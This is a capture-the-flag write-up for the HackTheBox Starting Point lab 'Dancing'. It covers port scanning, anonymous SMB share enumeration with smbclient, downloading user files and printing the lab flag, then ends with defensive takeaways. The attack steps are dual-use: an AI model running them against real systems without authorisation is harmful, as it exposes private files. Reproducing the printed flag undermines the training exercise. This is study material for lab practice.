# Dancing

This is a HackTheBox Starting Point lab for practicing Windows service enumeration, SMB anonymous access testing, and share-based file retrieval.

## Reconnaissance

Started with **RustScan** and **Nmap** to identify open ports and services on the target.

```bash
rustscan --ulimit 5000 -a $target -- -sC -sV
```

The scan identified several Windows services:

```text
135/tcp   Microsoft Windows RPC
139/tcp   Microsoft Windows netbios-ssn
445/tcp   Microsoft-DS / SMB
5985/tcp  Microsoft HTTPAPI httpd 2.0
47001/tcp Microsoft HTTPAPI httpd 2.0
49664/tcp Microsoft Windows RPC
49665/tcp Microsoft Windows RPC
49666/tcp Microsoft Windows RPC
49667/tcp Microsoft Windows RPC
49668/tcp Microsoft Windows RPC
49669/tcp Microsoft Windows RPC
```

The host was identified as a Windows target. Nmap also reported SMB message signing as enabled but not required.

---

## SMB Share Enumeration

Listed available SMB shares anonymously:

```bash
smbclient -N -L //$target/
```

The share listing showed:

```text
ADMIN$      Disk      Remote Admin
C$          Disk      Default share
IPC$        IPC       Remote IPC
WorkShares  Disk
```

The `WorkShares` share was accessible without credentials.

---

## Anonymous Share Access

Connected to the `WorkShares` share:

```bash
smbclient //$target/WorkShares -N
```

The share contained two user directories:

```text
Amy.J
James.P
```

Inside `Amy.J`, a file named `worknotes.txt` was available:

```text
smb: \Amy.J\> ls
worknotes.txt
```

Downloaded the file:

```text
smb: \Amy.J\> get worknotes.txt
```

The contents were:

```text
- start apache server on the linux machine
- secure the ftp server
- setup winrm on dancing
```

The notes confirmed that the target was named **Dancing** and also hinted at WinRM configuration work.

---

## Flag Retrieval

The `James.P` directory contained `flag.txt`:

```text
smb: \James.P\> ls
flag.txt
```

Downloaded the file:

```text
smb: \James.P\> get flag.txt
```

Read the flag locally:

```bash
cat flag.txt
```

Result:

```text
5f61c10dffbc77a704d76016a22f1664
```

---

## Attack Path

```text
RustScan / Nmap
        ↓
Windows Service Discovery
        ↓
SMB Share Enumeration
        ↓
Anonymous WorkShares Access
        ↓
User Directory Enumeration
        ↓
worknotes.txt Retrieval
        ↓
flag.txt Retrieval
```

## Key Takeaways

* Anonymous SMB access can expose internal files without valid credentials.
* User-specific share folders may contain sensitive operational notes or proof files.
* SMB message signing being enabled but not required is a configuration worth reviewing.
* Basic SMB enumeration is often enough to uncover high-value information on misconfigured Windows hosts.
